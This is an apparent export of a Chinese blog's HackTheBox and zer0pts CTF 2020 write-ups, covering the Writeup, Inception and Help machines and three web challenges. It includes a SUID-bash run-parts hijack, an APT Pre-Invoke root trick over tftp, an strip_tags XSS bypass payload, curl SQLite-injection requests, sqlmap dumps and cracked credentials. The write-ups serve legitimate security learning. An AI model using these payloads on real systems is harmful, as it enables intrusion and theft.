&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9 user flag得到的账号密码ssh登录，得到user.txt: 提权信息运行pspy之类的可以发现，当ssh登录时，root权限运行这些： 123sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.newrun-parts --lsbsysinit /etc/update-motd.d/bin/sh /etc/update-motd.d/10-uname 而jkr用户在staff组，可以写入对应路径： 那就可以进行run-parts劫持 提权 &amp; root flag直接修改run-parts，重新登录触发执行，读取root.txt 1echo -e '#!/bin/bash\\n\\ncp /bin/bash /bin/miao\\nchmod u+s /bin/miao' &gt; /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts 参考资料 CMS Made Simple &lt; 2.2.10 - SQL Injection - PHP webapps Exploithttps://www.exploit-db.com/exploits/46635 HTB: Writeup | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/10/12/htb-writeup.html https://www.hackthebox.eu/home/machines/writeup/192 HackTheBox - Writeup - YouTubehttps://www.youtube.com/watch?v=GKq4cwBfH24&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Inception - HackTheBox","slug":"Inception-HackTheBox","date":"2020-03-13T07:11:20.000Z","updated":"2021-05-28T07:13:26.531Z","comments":true,"path":"2020/03/13/Inception-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/13/Inception-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/117 10.10.10.67 端口扫描80和3128: 12345678910111213141516$ nmap -sC -sV 10.10.10.67Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-28 14:04 CSTNmap scan report for 10.10.10.67Host is up (0.069s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Inception3128/tcp open http-proxy Squid http proxy 3.5.12|_http-server-header: squid/3.5.12|_http-title: ERROR: The requested URL could not be retrievedService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 94.14 seconds 80源码最底部给出提示，dompdf： dompdf直接访问dompdf可以列出文件，version可以知道是0.6.0: vulns搜到两个漏洞： dompdf 0.6.0 - ‘dompdf.php?read’ Arbitrary File Read - PHP webapps Exploithttps://www.exploit-db.com/exploits/33004 dompdf 0.6.0 beta1 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/14851 文件读取文件读取是渲染成pdf，base64解码得到内容： webdav后面就是读文件获取信息，发现webdav： 12345678910111213141516/etc/apache2/sites-enabled/000-default.confAlias /webdav_test_inception /var/www/html/webdav_test_inception &lt;Location /webdav_test_inception&gt; Options FollowSymLinks DAV On AuthType Basic AuthName \"webdav test credential\" AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd Require valid-user &lt;/Location&gt; # 读取wbdav密码/var/www/html/webdav_test_inception/webdav.passwdwebdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0# 破解出明文babygurl69 webshell通过Webdav写webshell： 因为有401基础认证，用蚁剑的话记得配置下header： wp-config.php有个woirdpress，config里得到数据库配置信息： 12define(&#39;DB_USER&#39;, &#39;root&#39;);define(&#39;DB_PASSWORD&#39;, &#39;VwPddNh7xMZyDQoByQL4&#39;); 代理扫描因为前面看到有3128 squid代理，尝试通过代理扫描本机,发现通过代理可以访问22: 12345678910msf6 exploit(windows/smb/ms17_010_eternalblue_win8) &gt; use auxiliary/scanner/http/squid_pivot_scanningmsf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RPORT 3128RPORT =&gt; 3128msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RHOSTS 10.10.10.67RHOSTS =&gt; 10.10.10.67msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set RANGE 127.0.0.1RANGE =&gt; 127.0.0.1msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; set PORTS 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22PORTS =&gt; 21,80,139,443,445,1433,1521,1723,3389,8080,9100,22msf6 auxiliary(scanner/http/squid_pivot_scanning) &gt; run ssh &amp; user flag那就可以尝试通过代理连接，密码就是数据库的root密码： 123http 10.10.10.67 3128proxychainse ssh cobb@127.0.1.1 提权信息当前用户无限制sudo，但root.txt提示在其他地方： 扫描根据ip地址和dns配置等信息，进一步扫描： 1nc -zv 192.168.0.1 1-65535 &amp;&gt; results &amp;&amp; cat results | grep succeeded FTPftp匿名访问，看起来是整个系统： crontab根据/etc/crontab，每5分钟一次apt更新，而更新时会运行/etc/apt/apt.conf.d/里的命令： 12345678910111213141516# &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# m h dom mon dow user command17 * * * * root cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6 * * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6 * * 7 root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 6 1 * * root test -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )*&#x2F;5 * * * * root apt update 2&gt;&amp;1 &gt;&#x2F;var&#x2F;log&#x2F;apt&#x2F;custom.log30 23 * * * root apt upgrade -y 2&gt;&amp;1 &gt;&#x2F;dev&#x2F;null 利用方式就是生成ssh密钥，写进去，命令也写进去，等待触发(ftp没有写权限，tftp可以，这个也可以通过查看配置文件知道)： 123456789ssh-keygentftp 192.168.0.1tftp&gt; put /root/.ssh/id_rsa.pub /root/.ssh/authorized_keysecho 'APT::Update::Pre-Invoke &#123;\"chmod 600 /root/.ssh/authorized_keys\"&#125;;' &gt; 00commandtftp 192.168.0.1tftp&gt; put 00command /etc/apt/apt.conf.d/00command root flag5分钟自动执行后，ssh连进去，得到root.txt: 参考资料 dompdf 0.6.0 - ‘dompdf.php?read’ Arbitrary File Read - PHP webapps Exploithttps://www.exploit-db.com/exploits/33004 dompdf 0.6.0 beta1 - Remote File Inclusion - PHP webapps Exploithttps://www.exploit-db.com/exploits/14851 Inception write-up - The Portal of Knowledgehttps://alamot.github.io/inception_writeup/ https://www.hackthebox.eu/home/machines/writeup/117 HackTheBox - Inception - YouTubehttps://www.youtube.com/watch?v=J2I-5xPgyXk&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Help - HackTheBox","slug":"Help-HackTheBox","date":"2020-03-12T08:11:35.000Z","updated":"2021-05-19T08:13:03.770Z","comments":true,"path":"2020/03/12/Help-HackTheBox/","link":"","permalink":"https://darkwing.moe/2020/03/12/Help-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.eu/home/machines/profile/170 10.10.10.121 端口扫描22,80,3000: 12345678910111213141516171819202122$ nmap -sC -sV -Pn 10.10.10.121Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 14:34 CSTNmap scan report for 10.10.10.121Host is up (0.067s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)| 256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)|_ 256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It works3000/tcp open http Node.js Express framework|_http-title: Site doesn't have a title (application/json; charset=utf-8).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.47 seconds 80apache默认页面： 3000 目录扫描helpdeskz80发现support，是helpdesk,用的开源HelpDeskZ ： https://github.com/helpdesk-z/helpdeskz-dev 1234gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 50/javascript (Status: 301) [Size: 317] [--&gt; http://10.10.10.121/javascript/]/support (Status: 301) [Size: 314] [--&gt; http://10.10.10.121/support/] 根据README.md知道版本是1.0.2 graphql3000根据提示可以搜到是graphql，硬扫也能扫到： 123gobuster dir -u http://10.10.10.121:3000/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50/graphql (Status: 400) [Size: 18] graphql可以手工枚举，也可以用插件，得到query格式，根据格式得到用户密码： doyensec/inql: InQL - A Burp Extension for GraphQL Security Testinghttps://github.com/doyensec/inql 123&#123;&quot;data&quot;:&#123;&quot;user&quot;:&#123;&quot;password&quot;:&quot;5d3c93182bb20f07b994a7f617e99cff&quot;,&quot;username&quot;:&quot;helpme@helpme.com&quot;&#125;&#125;&#125;godhelpmeplz helpdeskz搜到两个漏洞： HelpDeskZ 1.0.2 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/40300 HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download - PHP webapps Exploithttps://www.exploit-db.com/exploits/41200 sql注入已有账号密码，登录进去： 可以直接sqlmap，得到admin密码： 12345678910sqlmap -r sql.txt -v 3 --level 3 --batch --threads=10 -D support -T staff --dumpDatabase: supportTable: staff[1 entry]+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+| id | admin | login | email | status | avatar | username | fullname | timezone | password | signature | last_login | department | newticket_notification |+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+| 1 | 1 | 1547216217 | support@mysite.com | Enable | NULL | admin | Administrator | &lt;blank&gt; | d318f44739dced66793b1a603028133a76ae680e (Welcome1) | Best regards,\\r\\nAdministrator | 1543429746 | a:1:&#123;i:0;s:1:\"1\";&#125; | 0 |+----+-------+------------+--------------------+--------+--------+----------+---------------+----------+-----------------------------------------------------+--------------------------------+------------+--------------------+------------------------+ 文件上传 getshell也可以通过文件上传方式，上传php提示不允许，实际上已上传，需要找到文件名,然后就可以reverse shell： user flagssh使用得到的密码登录，或者使用文件上传得到的help shell，得到user.txt: 提权信息内核提权： 12help@help:~$ uname -aLinux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/44298 https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh 提权 &amp; root flag任意一个可用exp，提到root，读取root.txt: 参考资料 https://github.com/helpdesk-z/helpdeskz-dev HelpDeskZ 1.0.2 - Arbitrary File Upload - PHP webapps Exploithttps://www.exploit-db.com/exploits/40300 HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download - PHP webapps Exploithttps://www.exploit-db.com/exploits/41200 doyensec/inql: InQL - A Burp Extension for GraphQL Security Testinghttps://github.com/doyensec/inql Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation - Linux local Exploithttps://www.exploit-db.com/exploits/44298 https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh HTB: Help | 0xdf hacks stuffhttps://0xdf.gitlab.io/2019/06/08/htb-help.html https://www.hackthebox.eu/home/machines/writeup/170 HackTheBox - Help - YouTubehttps://www.youtube.com/watch?v=XB8CbhfOczU&amp;ab_channel=IppSec","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"MusicBlog -- zer0pts CTF 2020","slug":"MusicBlog-zer0pts-CTF-2020","date":"2020-03-10T08:42:03.000Z","updated":"2020-03-10T08:47:45.520Z","comments":true,"path":"2020/03/10/MusicBlog-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/MusicBlog-zer0pts-CTF-2020/","excerpt":"","text":"You can introduce favorite songs to friends with MusicBlog! Challenge (URL) 题目文件: MusicBlog_637545797ab8638bffd877d7be2ec045.tar.gz 是一个Blog。在发布文章时可以选择是否公开，如果设置为公开，admin用户会自动访问该文章并点赞。写文章时可以使用[[URL]]语法，将其插入到句子中会展开成&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;这样的audio元素。 首先，确认flag在哪。搜索zer0pts{ ，能够发现flag在worker/worker.js中，这是admin自动访问代码的一部分。 123456789101112131415161718192021222324// (snipped)const flag = 'zer0pts&#123;&lt;censored&gt;&#125;';// (snipped)const crawl = async (url) =&gt; &#123; console.log(`[+] Query! ($&#123;url&#125;)`); const page = await browser.newPage(); try &#123; await page.setUserAgent(flag); await page.goto(url, &#123; waitUntil: 'networkidle0', timeout: 10 * 1000, &#125;); await page.click('#like'); &#125; catch (err)&#123; console.log(err); &#125; await page.close(); console.log(`[+] Done! ($&#123;url&#125;)`)&#125;;// (snipped) await page.setUserAgent(flag);,会将User-Agent设置为flag。那么首先，考虑找到一个使用[[URL]]进行外部请求的方法，但是Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; script-src &#39;nonce-yuAhic5Y6HSsT0e5zC8Qlg==&#39; &#39;strict-dynamic&#39;; base-uri &#39;none&#39;; trusted-types,严格的CSP策略会禁止这样。 但是，admin会进行await page.click(&#39;#like&#39;);，如果能够将一个可控元素的id设置为like，就可以利用admin的click，考虑通过XSS将admin重定向访问到外部。 查看文章的单独页面post.php, 能够发现这里将文章内容作为参数，经过render_tags后返回值显示在页面上。 12345︙ &lt;div class&#x3D;&quot;mt-3&quot;&gt; &lt;?&#x3D; render_tags($post[&#39;content&#39;]) ?&gt; &lt;&#x2F;div&gt;︙ render_tags在utils.php 中定义： 12345678&lt;?php&#x2F;&#x2F; [[URL]] → &lt;audio src&#x3D;&quot;URL&quot;&gt;&lt;&#x2F;audio&gt;function render_tags($str) &#123; $str &#x3D; preg_replace(&#39;&#x2F;\\[\\[(.+?)\\]\\]&#x2F;&#39;, &#39;&lt;audio controls src&#x3D;&quot;\\\\1&quot;&gt;&lt;&#x2F;audio&gt;&#39;, $str); $str &#x3D; strip_tags($str, &#39;&lt;audio&gt;&#39;); &#x2F;&#x2F; only allows &#96;&lt;audio&gt;&#96; return $str;&#125;︙ [[URL]]替换为&lt;audio controls src=&quot;URL&quot;&gt;&lt;/audio&gt;之后，通过strip_tags将audio 之外的标签消除来防止XSS。那如果使用[[&quot;&gt;&lt;/audio&gt;&lt;script&gt;alert(1)&lt;/script&gt;]] 作为URL，经过这种处理之后就变成了&lt;audio controls src=&quot;&quot;&gt;&lt;/audio&gt;alert(1)&quot;&gt;&lt;/audio&gt;,&lt;script&gt; 和&lt;/script&gt;都被删除了，做不了什么。 看一下Web server的Dockerfile，可以看到使用的是PHP 7.4.0， 截至2020年3月7日，最新版本为PHP 7.4.3，看起来稍微有点老，因此可以看一下PHP 7.4.0之后的PHP 7.4.1的ChangeLog。 Standard: Fixed bug #78814 (strip_tags allows / in tag name =&gt; whitelist bypass). 可以看到修复了strip_tags的一个bug，详细说明见 https://bugs.php.net/bug.php?id=78814 Bug #78814 strip_tags allows / in tag name, allowing whitelist bypass in browsers When strip_tags is used with a whitelist of tags, php allows slashes (“/”) that occur inside the name of a whitelisted tag and copies them to the result. For example, if is whitelisted, then a tag is also kept. 12345678910111213Test script:---------------&lt;?phpecho strip_tags(&quot;&lt;s&#x2F;trong&gt;b&lt;&#x2F;strong&gt;&quot;, &quot;&lt;strong&gt;&quot;);Expected result:----------------bActual result:--------------&lt;s&#x2F;trong&gt;b&lt;&#x2F;strong&gt; 将&lt;strong&gt; 作为白名单时，添加斜杠的&lt;s/trong&gt;没有被删除，原样输出。MusicBlog 中使用的是&lt;audio&gt;作为白名单，&lt;a/udio&gt;可以通过函数处理，并且&lt;a/udio&gt;会作为 超链接&lt;a&gt;被解析。 因此，利用这个bug，使用[[&quot;&gt;&lt;/audio&gt;&lt;a/udio href=&quot;(URL)&quot; id=&quot;like&quot;&gt;test&lt;/a/udio&gt;&lt;audio a=&quot;]] 这样的内容的话，经过处理在文章中展开后是 1&lt;audio controls src=\"\"&gt;&lt;/audio&gt;&lt;a/udio href=\"(URL)\" id=\"like\"&gt;test&lt;/a/udio&gt;&lt;audio a=\"\"&gt;&lt;/audio&gt; 这样admin自动去点击id为like的标签的话，会点击到我们可控的外部链接。 123456789101112$ nc -lvp 8000Listening on [0.0.0.0] (family 0, port 8000)Connection from ec2-3-112-201-75.ap-northeast-1.compute.amazonaws.com 33926 received!GET / HTTP/1.1︙Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: zer0pts&#123;M4sh1m4fr3sh!!&#125;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9︙Accept-Encoding: gzip, deflateAccept-Language: en-US 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"phpNantokaAdmin -- zer0pts CTF 2020","slug":"phpNantokaAdmin-zer0pts-CTF-2020","date":"2020-03-10T06:20:17.000Z","updated":"2020-03-10T06:21:31.283Z","comments":true,"path":"2020/03/10/phpNantokaAdmin-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/phpNantokaAdmin-zer0pts-CTF-2020/","excerpt":"","text":"phpNantokaAdmin is a management tool for SQLite. Challenge (URL) 题目文件: phpNantokaAdmin_49b112bf908ecef40f17684f4120b0aa.tar.gz 题目是一个SQLite数据库管理工具，实现的功能只有table的创建，展示，record的插入，首先确认一下flag在哪里： 123456&lt;?php︙ $pdo-&gt;query('CREATE TABLE `' . FLAG_TABLE . '` (`' . FLAG_COLUMN . '` TEXT);'); $pdo-&gt;query('INSERT INTO `' . FLAG_TABLE . '` VALUES (\"' . FLAG . '\");'); $pdo-&gt;query($sql);︙ 创建了一个flag表，其中插入了flag记录。表名和列名是config.php中定义的常量，另外： 123456789&lt;?php︙ $pdo = new PDO('sqlite:db/' . $_SESSION['database']); $stmt = $pdo-&gt;query(\"SELECT name FROM sqlite_master WHERE type='table' AND name &lt;&gt; '\" . FLAG_TABLE . \"' LIMIT 1;\"); $table_name = $stmt-&gt;fetch(PDO::FETCH_ASSOC)['name']; $stmt = $pdo-&gt;query(\"PRAGMA table_info(`&#123;$table_name&#125;`);\"); $column_names = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);︙ 这样限制了可以展示的表仅限于flag表之外用户创建的表。 index.php中可以看出，创建表时表名，列名，列类型可能存在SQL注入： 123456789101112131415161718192021222324252627282930&lt;?php︙ if (!is_valid($table_name)) &#123; flash('Table name contains dangerous characters.'); &#125; if (strlen($table_name) &lt; 4 || 32 &lt; strlen($table_name)) &#123; flash('Table name must be 4-32 characters.'); &#125; if (count($columns) &lt;= 0 || 10 &lt; count($columns)) &#123; flash('Number of columns is up to 10.'); &#125; $sql = \"CREATE TABLE &#123;$table_name&#125; (\"; $sql .= \"dummy1 TEXT, dummy2 TEXT\"; for ($i = 0; $i &lt; count($columns); $i++) &#123; $column = (string) ($columns[$i]['name'] ?? ''); $type = (string) ($columns[$i]['type'] ?? ''); if (!is_valid($column) || !is_valid($type)) &#123; flash('Column name or type contains dangerous characters.'); &#125; if (strlen($column) &lt; 1 || 32 &lt; strlen($column) || strlen($type) &lt; 1 || 32 &lt; strlen($type)) &#123; flash('Column name and type must be 1-32 characters.'); &#125; $sql .= ', '; $sql .= \"`$column` $type\"; &#125; $sql .= ');';︙ 但是，参数使用了utils.php中定义的is_valid函数进行一次检查，禁用了一些特殊字符： 1234567891011121314&lt;?php︙function is_valid($string) &#123; $banword = [ // comment out, calling function... \"[\\\"#'()*,\\\\/\\\\\\\\`-]\" ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $string)) &#123; return false; &#125; return true;&#125;︙ 首先确认下能够通过is_valid函数的字符： 12345678910111213141516171819202122232425$ cat test.php&lt;?phpfunction is_valid($string) &#123; $banword = [ // comment out, calling function... \"[\\\"#'()*,\\\\/\\\\\\\\`-]\" ]; $regexp = '/' . implode('|', $banword) . '/i'; if (preg_match($regexp, $string)) &#123; return false; &#125; return true;&#125;$res = '';for ($i = 0x20; $i &lt; 0x7f; $i++) &#123; $c = chr($i); if (is_valid($c)) &#123; $res .= $c; &#125;&#125;echo $res . \"\\n\";$ php test.php !$%&amp;+.0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz&#123;|&#125;~ 注意结果，[和]可以使用，在SQLite中，可以使用[和]代替反引号`,来包裹关键词（文档） 另外，SQLite中可以使用CREATE TABLE … AS这样的用法，从其他的表的内容来创建新的表。 利用这些，在创建表时，表名t AS SELECT sql [, 列名abc，列类型]FROM sqlite_master;, 这样拼接后的SQL为： 1CREATE TABLE t AS SELECT sql [ (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; ]FROM sqlite_master;); 等价于CREATE TABLE t AS SELECT sql FROM sqlite_master;,(dummy1…被解释为sql的别名。这样在展示表时可以获得插入flag时的语句，其中包括flag表名和列名： 12345678910111213141516171819202122232425262728293031$ curl &#39;http:&#x2F;&#x2F;3.112.201.75:8002&#x2F;?page&#x3D;create&#39; -b cookie.txt -c cookie.txt -L -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; --data &#39;table_name&#x3D;t+AS+SELECT+sql+%5B&amp;columns%5B0%5D%5Bname%5D&#x3D;abc&amp;columns%5B0%5D%5Btype%5D&#x3D;%5DFROM+sqlite_master%3B&#39;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&quot; integrity&#x3D;&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo&#x3D;&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt; &lt;title&gt;phpNantokaAdmin&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;phpNantokaAdmin&lt;&#x2F;h1&gt; &lt;h2&gt;t (&lt;a href&#x3D;&quot;?page&#x3D;delete&quot;&gt;Delete table&lt;&#x2F;a&gt;)&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;?page&#x3D;insert&quot; method&#x3D;&quot;POST&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; &lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;CREATE TABLE &#96;flag_bf1811da&#96; (&#96;flag_2a2d04c3&#96; TEXT)&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;values[]&quot;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Insert values&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 得到了flag表名和列名，替换语句中的sql和sqlite_master 即可获得flag： 12345678910111213141516171819202122232425262728$ curl &#39;http:&#x2F;&#x2F;3.112.201.75:8002&#x2F;?page&#x3D;create&#39; -b cookie.txt -c cookie.txt -L -H &#39;Content-Type: application&#x2F;x-www-form-urlencoded&#39; --data &#39;table_name&#x3D;t+AS+SELECT+flag_2a2d04c3+%5B&amp;columns%5B0%5D%5Bname%5D&#x3D;abc&amp;columns%5B0%5D%5Btype%5D&#x3D;%5DFROM+flag_bf1811da%3B&#39;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;style.css&quot;&gt; &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&quot; integrity&#x3D;&quot;sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo&#x3D;&quot; crossorigin&#x3D;&quot;anonymous&quot;&gt;&lt;&#x2F;script&gt; &lt;title&gt;phpNantokaAdmin&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;phpNantokaAdmin&lt;&#x2F;h1&gt; &lt;h2&gt;t (&lt;a href&#x3D;&quot;?page&#x3D;delete&quot;&gt;Delete table&lt;&#x2F;a&gt;)&lt;&#x2F;h2&gt; &lt;form action&#x3D;&quot;?page&#x3D;insert&quot; method&#x3D;&quot;POST&quot;&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt; (dummy1 TEXT, dummy2 TEXT, &#96;abc&#96; &lt;&#x2F;th&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;zer0pts&#123;Smile_Sweet_Sister_Sadistic_Surprise_Service_SQL_Injection!!&#125;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;values[]&quot;&gt;&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Insert values&quot;&gt; &lt;&#x2F;form&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 参考资料https://st98.github.io/diary/posts/2020-03-09-zer0pts-ctf-2020.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"}]},{"title":"Can you guess it? -- zer0pts CTF 2020","slug":"Can-you-guess-it-zer0pts-CTF-2020","date":"2020-03-10T02:17:18.000Z","updated":"2020-03-10T02:17:59.920Z","comments":true,"path":"2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/","link":"","permalink":"https://darkwing.moe/2020/03/10/Can-you-guess-it-zer0pts-CTF-2020/","excerpt":"","text":"Challenge (URL) 题目文件: Can_you_guess_it_ffc668f78ed564bf7a62463fd16bc26c.tar.gz index.php 内容如下： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpinclude &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.phpif (preg_match(&#39;&#x2F;config\\.php\\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123; exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);&#125;if (isset($_GET[&#39;source&#39;])) &#123; highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); exit();&#125;$secret &#x3D; bin2hex(random_bytes(64));if (isset($_POST[&#39;guess&#39;])) &#123; $guess &#x3D; (string) $_POST[&#39;guess&#39;]; if (hash_equals($secret, $guess)) &#123; $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG; &#125; else &#123; $message &#x3D; &#39;Wrong.&#39;; &#125;&#125;?&gt;&lt;!doctype html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt; &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt; &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt; &lt;hr&gt;&lt;?php if (isset($message)) &#123; ?&gt; &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;&lt;?php &#125; ?&gt; &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt; &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt; &lt;input type&#x3D;&quot;submit&quot;&gt; &lt;&#x2F;form&gt; 